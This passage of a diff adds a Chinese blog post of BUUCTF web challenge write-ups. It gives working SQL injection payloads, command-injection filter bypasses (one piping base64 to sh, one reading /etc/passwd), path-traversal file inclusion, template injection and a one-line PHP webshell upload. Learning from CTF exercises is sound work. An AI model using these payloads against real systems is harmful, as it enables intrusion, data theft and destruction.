+<td>Range: bytes=500-999</td>
+</tr>
+<tr>
+<td>Referer</td>
+<td>先前网页的地址，当前请求网页紧随其后,即来路</td>
+<td>Referer: <a target="_blank" rel="noopener" href="http://www.zcmhi.com/archives/71.html">http://www.zcmhi.com/archives…</a></td>
+</tr>
+<tr>
+<td>TE</td>
+<td>客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</td>
+<td>TE: trailers,deflate;q=0.5</td>
+</tr>
+<tr>
+<td>Upgrade</td>
+<td>向服务器指定某种传输协议以便服务器进行转换（如果支持）</td>
+<td>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</td>
+</tr>
+<tr>
+<td>User-Agent</td>
+<td>User-Agent的内容包含发出请求的用户信息</td>
+<td>User-Agent: Mozilla/5.0 (Linux; X11)</td>
+</tr>
+<tr>
+<td>Via</td>
+<td>通知中间网关或代理服务器地址，通信协议</td>
+<td>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</td>
+</tr>
+<tr>
+<td>Warning</td>
+<td>关于消息实体的警告信息</td>
+<td>Warn: 199 Miscellaneous warning</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="四、-极客大挑战-2019-EasySQL1"><a href="#四、-极客大挑战-2019-EasySQL1" class="headerlink" title="四、[极客大挑战 2019]EasySQL1"></a>四、[极客大挑战 2019]EasySQL1</h2><p>首先随便输入一个账号密码</p>
+<p><img src="/2021/01/16/BUUctf-wp/22.png"></p>
+<p><img src="/2021/01/16/BUUctf-wp/9.jpg"></p>
+<p>虽然看题是sql注入但依据流程首先还是要检查有无注入payload：username=1’  or 1=1%23&amp;password=1</p>
+<p><img src="/2021/01/16/BUUctf-wp/23.png"></p>
+<p>没想到flag直接出现，真是还没开始就结束了。</p>
+<h2 id="五、-强网杯-2019-随便注"><a href="#五、-强网杯-2019-随便注" class="headerlink" title="五、[强网杯 2019]随便注"></a>五、[强网杯 2019]随便注</h2><p>首先看看输入的内容是由什么闭合的，payload: inject=1%27</p>
+<p><img src="/2021/01/16/BUUctf-wp/26.jpg"></p>
+<p>结果报错，并且显示是由单引号闭合的。</p>
+<p>有没有注入漏洞 payload：inject=1‘ and 1=1%23</p>
+<p><img src="/2021/01/16/BUUctf-wp/24.png"></p>
+<p>结果回显与inject=1相同，即正确</p>
+<p>接着试试payload：inject=1’ and 1=2%23</p>
+<p><img src="/2021/01/16/BUUctf-wp/25.png"></p>
+<p>结果无回显，说明存在字符型注入漏洞</p>
+<p>接着查看字段数<code>?inject=1%27 order by 2 %23</code>回显正确；</p>
+<p><code>?inject=1%27 order by 3 %23</code>回显报错，即表示有两个注入字段</p>
+<p><img src="/2021/01/16/BUUctf-wp/27.jpg"></p>
+<p><img src="/2021/01/16/BUUctf-wp/28.jpg"></p>
+<p>接着用量注入payload：?inject=1%27 union select 1,2%23</p>
+<p><img src="/2021/01/16/BUUctf-wp/29.jpg"></p>
+<p>结果回显基本的查询关键词都被过滤了。</p>
+<p>百度后才知道这涉及到叠堆注入和改数据库（是我没接触过的内容）。</p>
+<p>堆叠注入原理</p>
+<p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
+<p>比如输入 1’;show tables;# 结果先出现最初回显的两个字段，接着又出现两张表名。</p>
+<p><img src="/2021/01/16/BUUctf-wp/30.png"></p>
+<p>接着分别查看两张表的内容 </p>
+<p><img src="/2021/01/16/BUUctf-wp/31.png"></p>
+<p><img src="/2021/01/16/BUUctf-wp/32.png"></p>
+<p>注：这里的inject要等于0，如果等于1查询words表时就只能显示最初的数据，可能是有字段数限制。第二个数字表要用``引用。</p>
+<p>显然flag字段在第二个表，而最初显示的数据就是words表，id=1，data=hahaha，所以这里用到了改名和修改表，因为可以堆叠查询，这时候就想到了一个改名的方法，把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id，把flag字段和其值显现出来，并且这里没有过滤rename和alter。</p>
+<p>alter用法：</p>
+<p>1：删除列</p>
+<p>ALTER TABLE 【表名】 DROP 【列名】<br>2：增加列</p>
+<p>ALTER TABLE 【表名】 ADD 【列名】 【类型】<br>alter table table1 add transactor varchar(10) not Null;<br>3：重命名列</p>
+<p>ALTER TABLE 【表名】 CHANGE 【列名】【新名】<br>4：修改表字段</p>
+<p>alter table 表名称 change 字段名称 字段名称 字段类型 [是否允许非空];<br>alter table 表名称 modify 字段名称 字段类型 [是否允许非空];<br>5：查询表的字段信息</p>
+<p>desc 表名称;<br>6：创建索引</p>
+<p>ALTER TABLE tbl_name ADD INDEX index_name (column list);<br>7：删除索引</p>
+<p>ALTER TABLE tbl_name DROP INDEX index_name (column list);<br>8：修改表名</p>
+<p>ALTER TABLE tbl_name rename new_tbl_name;</p>
+<p>rename:</p>
+<p>rename table old_table to new_table;</p>
+<p>payload=<code>0&#39;;rename table words to words1;rename table 1919810931114514 to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</code></p>
+<p><img src="/2021/01/16/BUUctf-wp/33.png"></p>
+<p>所以原本回显id，hahaha的位置就变成flag了。</p>
+<h2 id="六、-SUCTF-2019-EasySQL"><a href="#六、-SUCTF-2019-EasySQL" class="headerlink" title="六、[SUCTF 2019]EasySQL"></a>六、[SUCTF 2019]EasySQL</h2><p>当输入输入数字的时候回显是：Array ( [0] =&gt; 1 )</p>
+<p>当输入字符时缺什么都不显示了，就算试了布尔＆时间盲注都是不回显的。想着试试上一题的叠堆注入经过多次尝试，发现不加引号和注释符才能成功。分别试了1;show databases; 和1;show tables;</p>
+<p><img src="/2021/01/16/BUUctf-wp/34.png"></p>
+<p><img src="/2021/01/16/BUUctf-wp/35.png"></p>
+<p>但是 1;show columns from flag;却没回显。</p>
+<p>查阅了大佬们的wp认为这是我的当前水平不可能做出来的。</p>
+<p>主要有2个方法。首先猜测后端是   ：                                                            <code>select $_POST[&#39;query&#39;] || flag from flag</code></p>
+<p>因为||（或）的存在，使得最终只回显前面的语句，而当我们输入数字时会创建一个临时列，比如Array ( [0] =&gt; 1 )</p>
+<h3 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h3><p>payload=<code>*,1</code></p>
+<p>该语句等于<code>select *,1 || flag from flag</code>   因为<code>1 || flag</code>等同于1，所以最终等同于<code>select *,1 from flag</code></p>
+<p><img src="/2021/01/16/BUUctf-wp/36.png"></p>
+<p>所以最终结果中不但有flag还有[1] =&gt;  1</p>
+<h3 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h3><p>payload=<code>1;set sql_mode=pipes_as_concat;select 1</code></p>
+<p>set sql_mode=pipes_as_concatd的意思很好理解，就是把||视为concat</p>
+<p>最终语句等同于1;select  concat(1,flag) from flag</p>
+<p><img src="/2021/01/16/BUUctf-wp/37.png"></p>
+<p>所以1的键值这次在前面。</p>
+<hr>
+<h2 id="七、-极客大挑战-2019-LoveSQL"><a href="#七、-极客大挑战-2019-LoveSQL" class="headerlink" title="七、[极客大挑战 2019]LoveSQL"></a>七、[极客大挑战 2019]LoveSQL</h2><p>首先 用户名输入 1’ or 1=1#  密码随便输</p>
+<p><img src="/2021/01/16/BUUctf-wp/38.jpg"></p>
+<p>以为flag出来了，没想到是假的，不过知道了用户名。</p>
+<p>接着查看注入段。order by 3时回显正常 order by 4 回显错误</p>
+<p><img src="/2021/01/16/BUUctf-wp/39.jpg"></p>
+<p><img src="/2021/01/16/BUUctf-wp/40.jpg"></p>
+<p>接着查看注入位 payload=<code>-1&#39; union select 1,2,3#</code></p>
+<p><img src="/2021/01/16/BUUctf-wp/41.jpg"></p>
+<p>注入位在2,3字段。接着看数据库名，payload=<code>-1&#39; union select 1,2,database()#</code></p>
+<p><img src="/2021/01/16/BUUctf-wp/42.jpg"></p>
+<p>当前数据库名为geek，接着爆表，payload=<code>-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</code></p>
+<p><img src="/2021/01/16/BUUctf-wp/43.jpg"></p>
+<p>接着爆geekuser和l0ve1ysq1的字段。payload=<code>-1‘ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’geekuser’#</code></p>
+<p><img src="/2021/01/16/BUUctf-wp/44.jpg"></p>
+<p>最后爆id，username，password数据 。payload=<code>-1’ union select 1,2,group_concat(id,username,password) from geekuser#</code></p>
+<p><img src="/2021/01/16/BUUctf-wp/45.jpg"></p>
+<p>得到flag。</p>
+<hr>
+<h2 id="八、-极客大挑战-2019-BabySQL1"><a href="#八、-极客大挑战-2019-BabySQL1" class="headerlink" title="八、[极客大挑战 2019]BabySQL1"></a>八、[极客大挑战 2019]BabySQL1</h2><p>首先由提示可知这次做了过滤，首先使用万能的<code>username=1‘ or 1=1#</code></p>
+<p><img src="/2021/01/16/BUUctf-wp/46.jpg"></p>
+<p>但是报错 并且报错内容不是闭合方式的原因 猜测过滤了or ，接着试了and 发现同样报错并且没了and，之后测试也发现过滤了union select</p>
+<p>查阅了他人的wp后知道这是用了replace函数，replace()函数直接用双写绕过就行了。如用户名：1’ oorr 1=1#  过滤后还有or  涨姿势了！</p>
+<p><img src="/2021/01/16/BUUctf-wp/47.jpg"></p>
+<p>回显正确。接着与上面题同样的思路继续注入</p>
+<p>爆库payload=<code>-1&#39; uniunionon selselectect 1,2,database()#</code></p>
+<p>爆表payload=<code>-1‘ uniunionon selselectect 1,2,group_concat(table_name) ffromrom infoorrmation_schema.tables whwhereere table_schema=database()#</code>  过程中发现了更多的关键字被过滤</p>
+<p>爆字段payload=<code>-1’ uniunionon selselectect 1,2,group_concat(column_name) ffromrom infoorrmation_schema.columns whwhereere table_schema=database() anandd table_name=&#39;b4bsql&#39;#</code></p>
+<p>爆数据payload=<code>-1’ uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) ffromrom b4bsql#</code></p>
+<p>password中也有or。</p>
+<p><img src="/2021/01/16/BUUctf-wp/48.jpg"></p>
+<hr>
+<h2 id="九、-GXYCTF2019-Ping-Ping-Ping"><a href="#九、-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="九、[GXYCTF2019]Ping Ping Ping"></a>九、[GXYCTF2019]Ping Ping Ping</h2><p>首先进入页面只有 <strong>/?ip=</strong>,由题目又想到在url中ping一下，于是打算ping一下回环地址看看会怎样 ，payload=<code>?ip=127.0.0.1</code></p>
+<p><img src="/2021/01/16/BUUctf-wp/49.jpg"></p>
+<p>ping成功了，看来这是可以执行命令的，试试看能不能ls目录，payload=?ip=127.0.0.1;ls</p>
+<p> <img src="/2021/01/16/BUUctf-wp/50.jpg"></p>
+<p>看来这是可以执行linux命令的，接着就想到了cat函数，看看能不能查看flag.php,没想到失败了。</p>
+<p><img src="/2021/01/16/BUUctf-wp/51.jpg"></p>
+<p>之后试了cat index.php,结果都是一样。猜想是不是cat被过滤了，试了下ca/t flag.php   还是以失败告终，但是回显不一样了，由回显提示，更加确定是后台有过滤操作，而前者是过滤了空格，后者过滤了符号。</p>
+<p><img src="/2021/01/16/BUUctf-wp/52.jpg"></p>
+<p>看了其他大佬的wp后涨了姿势。</p>
+<p><strong>当过滤了空格时可以</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%20(space)、%09(tab)、$IFS$9、 IFS、IFS</span><br><span class="line">使用&lt;或者&lt;&gt;来绕过空格 cat&lt;a.txt</span><br><span class="line">花括号扩展&#123;OS_COMMAND,ARGUMENT&#125; &#123;cat,&#x2F;etc&#x2F;passwd&#125;</span><br><span class="line">$IFS 空格绕过 cat$IFSa.txt</span><br><span class="line">变量控制 X&#x3D;$&#39;cat\x09.&#x2F;flag.php</span><br></pre></td></tr></table></figure>
+
+<p>构造<code>?ip=127.0.0.1;cat$IFS$1flag.php</code>   结果报错又变le，由提示可知应该是过滤了flag。</p>
+<p><img src="/2021/01/16/BUUctf-wp/53.jpg"></p>
+<p>这时试试有没有过滤index。</p>
+<p><img src="/2021/01/16/BUUctf-wp/54.jpg"></p>
+<p>结果出现了过滤信息</p>
+<ol>
+<li>可以通过变量实现字符串拼接</li>
+</ol>
+<p>​     构造/?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php 即可获取flag</p>
+<p>​     注：此处将变量ab的位置互换是为了绕过字符串匹配</p>
+<p> 2.通过执行sh命令来执行 （bash被过滤了，不然也可以执行）</p>
+<p>​      构造/?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-     d|sh</p>
+<p>​      注：sh是linux中运行shell的命令，bash相当于sh的升级版，sh∈bash</p>
+<hr>
+<p>关键字过滤</p>
+<p>使用空变量 使用$<em>和$@，$x(x 代表 1-9),${x}(x&gt;=10)(我尝试小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 ca${21}t a.txt<br>反斜杠 ca\t a.txt<br>变量替换 a=ca;b=t;c=a.txt; a a ab $c<br>引号 c’a’t flag.php<br>编码绕过<br>Base64 编码绕过：<br>root@kali:<del>/# echo ‘cat a.txt’| base64 Y2F0IGEudHh0Cg==<br>root@kali:</del>/# echo ‘Y2F0IGEudHh0Cg==’ | base64 -d abc<br>十六进制编码绕过：<br>root@kali:<del>/# echo ‘cat a.txt’ | xxd -p 63617420612e7478740a<br>root@kali:</del>/# echo ‘0x63617420612e7478740a’| xxd -r -p Abc<br>通配符 ？</em><br>[…]：匹配范围中任何一个字符 cat fl[abc]g.php<br>[a-z]：匹配 a-z 范围中任何一个字符 cat fl[a-z]g.php<br>{a,b}：对以逗号分割的文件列表进行拓展 cat fl{b,c}g.php</p>
+<hr>
+<h2 id="十、-RoarCTF-2019-Easy-Calc"><a href="#十、-RoarCTF-2019-Easy-Calc" class="headerlink" title="十、[RoarCTF 2019]Easy Calc"></a>十、[RoarCTF 2019]Easy Calc</h2><p>打开是一个计算机，试着算了1+2，能成功，但是换成字母就会失败。</p>
+<p><img src="/2021/01/16/BUUctf-wp/55.jpg"></p>
+<p><img src="/2021/01/16/BUUctf-wp/56.jpg"></p>
+<p>查看页面源代码。</p>
+<p><img src="/2021/01/16/BUUctf-wp/57.jpg"></p>
+<p>出现了两个信息，一个是有个提示设置了WAF安全，另一个是有个calc.php   访问下试试。</p>
+<p><img src="/2021/01/16/BUUctf-wp/58.jpg"></p>
+<p>设置了一个黑名单，可以用chr（）绕过。</p>
+<p>百度后知道，这里不给传字母，应该就是waf的作用。</p>
+<p>php处理字符时具有需要将所有参数转换为有效的变量名的特性，因此在解析查询字符串时，它会做两件事：</p>
+<ul>
+<li>删除空白符</li>
+<li>将某些字符转换为下划线（包括空格）</li>
+</ul>
+<p>如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)</p>
+<p>WAF不允许num传入字母，那我们可以在num前加个空格来绕过WAF</p>
+<p>所以可以先查看下phpinfo看看禁了什么函数。</p>
+<p><img src="/2021/01/16/BUUctf-wp/59.jpg"></p>
+<p>首先我们要先扫根目录下的所有文件，也就是用·scandir(“/“),但是“/”被过滤了，所以我们用chr(“47”)绕过,发现flagg文件</p>
+<p><img src="/2021/01/16/BUUctf-wp/60.jpg"></p>
+<p>接着可以用show_source、file_get_contents、include函数</p>
+<p>? num=print_r(show_source(‘/flagg’));<br>这里/=chr(47)，f=chr(102),l=chr(49),a=chr(97),g=chr(103),g=chr(103)来进行绕过num=print_r(show_source(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));</p>
+<hr>
+<h2 id="十一、-HCTF-2018-WarmUp"><a href="#十一、-HCTF-2018-WarmUp" class="headerlink" title="十一、[HCTF 2018]WarmUp"></a>十一、[HCTF 2018]WarmUp</h2><p>打开是一个滑稽，先查看原代码，发现了一个source.php</p>
+<p><img src="/2021/01/16/BUUctf-wp/61.jpg"></p>
+<p>访问后有php代码。</p>
+<p><img src="/2021/01/16/BUUctf-wp/62.jpg"></p>
+<p>其中有个hint.php,先访问看看。</p>
+<p><img src="/2021/01/16/BUUctf-wp/63.jpg"></p>
+<p>告诉我们flag在这里面    ，先审计下source.php的代码        </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        	<span class="comment">//设置白名单</span></span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];         </span><br><span class="line">            <span class="comment">//若$page未设置或为空 或 $page不是字符串，返回false</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">			<span class="comment">//若$page是$whitelist的值，返回true</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//在$page末尾添加?   并返回添加？后 首个？之前的字符串</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line"> <span class="comment">//$_page = $page           </span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>只有满足$_REQUEST[‘file’]非空 、$_REQUEST[‘file’]是字符串、emmm::checkFile($_REQUEST[‘file’])为true那么就会include $_REQUEST[‘file’]</p>
+<p>可以发现两次$page的url编码，第一次是url传入到服务器时解码了一次，第二次是page传给_page解码了一次</p>
+<p>第一个if要求page为字符串，否则返回false第二个if语句判断page是否存在于 whitelist 数组中，存在则返回 true 第三个if语句判断截取后的whitelist数组中，存在则返回true 第三个if语句判断截取后的$page是否在 whitelist数组中，截取 whitelist数组中，截取page中’?‘前部分，存在则返回true，第四个if语句判断url解码并截取后的 page是否存在于page是否存在于 page是否存在于whitelist中，存在则返回true<br>若以上四个if语句均未返回值，则返回false有三个if语句可以返回true，第二个语句直接判断$page，不可用<br>第三个语句截取’?‘前部分，由于?被后部分被解析为get方式提交的参数，也不可利用第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?’，仍可通过第四个if语句校验。<br>只要这四个if语句有一个为true即可包含file,</p>
+<p>所以payloadsource.php?file=source.php%253f/ffffllllaaaagggg，但是不知道ffffllllaaaagggg的具体位置，所以要不段增加../</p>
+<p><img src="/2021/01/16/BUUctf-wp/64.jpg"></p>
+<h2 id="十二、-极客大挑战-2019-Havefun"><a href="#十二、-极客大挑战-2019-Havefun" class="headerlink" title="十二、[极客大挑战 2019]Havefun"></a>十二、[极客大挑战 2019]Havefun</h2><p>打开一张猫打图片，无任何提示，首先查看页面源代码。</p>
+<p><img src="/2021/01/16/BUUctf-wp/65.jpg"></p>
+<p>就按照提示传参cat=dog，没想到直接结束。</p>
+<p><img src="/2021/01/16/BUUctf-wp/66.png"></p>
+<h2 id="十三、-ACTF2020-新生赛-Include"><a href="#十三、-ACTF2020-新生赛-Include" class="headerlink" title="十三、[ACTF2020 新生赛]Include"></a>十三、[ACTF2020 新生赛]Include</h2><p><img src="/2021/01/16/BUUctf-wp/67.jpg"></p>
+<p>点击tips</p>
+<p><img src="/2021/01/16/BUUctf-wp/68.jpg"></p>
+<p>结果没有什么发现，源代码也没有什么，但是由该url=?file=flag.php,和题目为include猜测是文件包含漏洞，试试伪协议构造payload =?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<p><img src="/2021/01/16/BUUctf-wp/69.jpg"></p>
+<p>base64解码</p>
+<p><img src="/2021/01/16/BUUctf-wp/70.jpg"></p>
+<hr>
+<h2 id="十四、-极客大挑战-2019-Knife1"><a href="#十四、-极客大挑战-2019-Knife1" class="headerlink" title="十四、[极客大挑战 2019]Knife1"></a>十四、[极客大挑战 2019]Knife1</h2><p>打开给了提示菜刀并且给了连接密码。</p>
+<p><img src="/2021/01/16/BUUctf-wp/71.png"></p>
+<p>这里我用蚁剑连接。</p>
+<p><img src="/2021/01/16/BUUctf-wp/72.jpg"></p>
+<p>连接成功。在根目录下发现flag。</p>
+<p><img src="/2021/01/16/BUUctf-wp/73.jpg"></p>
+<p><img src="/2021/01/16/BUUctf-wp/74.jpg"></p>
+<hr>
+<h2 id="十五、-护网杯-2018-easy-tornado"><a href="#十五、-护网杯-2018-easy-tornado" class="headerlink" title="十五、[护网杯 2018]easy_tornado"></a>十五、[护网杯 2018]easy_tornado</h2><p>打开给了3个文件<img src="/2021/01/16/BUUctf-wp/75.jpg"><img src="/2021/01/16/BUUctf-wp/78.jpg"></p>
+<p><img src="/2021/01/16/BUUctf-wp/76.jpg"><img src="/2021/01/16/BUUctf-wp/77.jpg"></p>
+<p>同时发现每个文件查看时url都是相似的<img src="/2021/01/16/BUUctf-wp/79.jpg"></p>
+<p>显然flag在fllllllag中，并且要按照hints中的方式查看。</p>
+<p>所以我们要按照这种方式传参                                                                          <code>file?filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))</code></p>
+<p>那么怎么找到cookie_secret呢？</p>
+<p>当访问file?filename=/fllllllllllllag时</p>
+<p><img src="/2021/01/16/BUUctf-wp/80.jpg"></p>
+<p>可以看到url中 error？msg=Error，修改msg的值后，回显为修改后的值</p>
+<p><img src="/2021/01/16/BUUctf-wp/81.jpg"></p>
+<p>查阅其他人的wp后知道这里需要用到在tornado的知识，大概就是在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量<br>修改error?msg=</p>
+<p><img src="/2021/01/16/BUUctf-wp/82.jpg"></p>
+<p>这就得到了cookie_secret</p>
+<p>接着就是将md5(cookie_secret+md5(filename))求出来就可以了</p>
+<p><img src="/2021/01/16/BUUctf-wp/83.png"></p>
+<hr>
+<h2 id="十六、-极客大挑战-2019-Http1"><a href="#十六、-极客大挑战-2019-Http1" class="headerlink" title="十六、[极客大挑战 2019]Http1"></a>十六、[极客大挑战 2019]Http1</h2><p>首先打开的界面没有什么信息，查看源代码，发现一个secret.php</p>
+<p><img src="/2021/01/16/BUUctf-wp/84.jpg"></p>
+<p><img src="/2021/01/16/BUUctf-wp/85.jpg"></p>
+<p>查看源代码也没发现什么信息，又根据题目我就猜到可能是要抓包改header请求头。</p>
+<p>这一步就需要加个Referer头</p>
+<p><img src="/2021/01/16/BUUctf-wp/86.jpg"></p>
+<p>接着又提示我们要用Syclover浏览器，继续伪造User Agent头</p>
+<p><img src="/2021/01/16/BUUctf-wp/87.jpg">接着又说访问者的地址是localhost。查询后发现，绕过方法有添加X-Forwarded-For绕过。</p>
+<p><img src="/2021/01/16/BUUctf-wp/88.jpg"></p>
+<p>成功获取flag。</p>
+<hr>
+<h2 id="十七、-极客大挑战-2019-Upload"><a href="#十七、-极客大挑战-2019-Upload" class="headerlink" title="十七、[极客大挑战 2019]Upload"></a>十七、[极客大挑战 2019]Upload</h2><p>由题目和界面可知这是要我们上传一个图片，首先随便上传一个图片</p>
+<p><img src="/2021/01/16/BUUctf-wp/89.jpg"></p>
+<p>但是它回显却说这不是图片</p>
+<p><img src="/2021/01/16/BUUctf-wp/90.jpg"></p>
+<p>看来是有过滤后缀名，之后写个一句话木马，不断尝试不同类型的格式，发现大多数格式都被过滤，只有phtml未被过滤</p>
+<script language="php">eval($_POST['1']);</script> 
+
+<p>上传后发现还是提示不是图片，可能是后缀的问题。这里可以抓包，并修改文件类型为image文件</p>
+<p><img src="/2021/01/16/BUUctf-wp/91.jpg">)</p>
+<p><img src="/2021/01/16/BUUctf-wp/92.jpg"></p>
+<p>但是回显却说这不是图片，应该是对图片内容进行了检测。</p>
+<p>这里还需要在文件内容开头加入GIF89a，这是用于检测是否是jpeg文件的文件头。</p>
+<p><img src="/2021/01/16/BUUctf-wp/93.jpg"></p>
+<p>上传成功，猜测在upload目录</p>
+<p><img src="/2021/01/16/BUUctf-wp/94.jpg"></p>
+<p>结果确实在，接下来用蚁剑连接</p>
+<p>之后用中国蚁剑连接，在根目录下找到flag</p>
+<p><img src="/2021/01/16/BUUctf-wp/95.jpg"></p>
+<hr>
+<h2 id="十八、-极客大挑战-2019-BuyFlag"><a href="#十八、-极客大挑战-2019-BuyFlag" class="headerlink" title="十八、[极客大挑战 2019]BuyFlag"></a>十八、[极客大挑战 2019]BuyFlag</h2><p>进入页面没有什么发现，查看源代码。</p>
+<p><img src="/2021/01/16/BUUctf-wp/96.jpg"></p>
+<p>这里要传参钱和密码，密码为404且不能为数字，百度后知道可以弱类型绕过，传个404a就可以绕过。钱的量想到最初的页面</p>
+<p><img src="/2021/01/16/BUUctf-wp/97.jpg"></p>
+<p>这里先抓包，传参</p>
+<p><img src="/2021/01/16/BUUctf-wp/98.jpg"></p>
+<p>但是没有反应，看了师傅们的wp后知道这里的user还要改成1。</p>
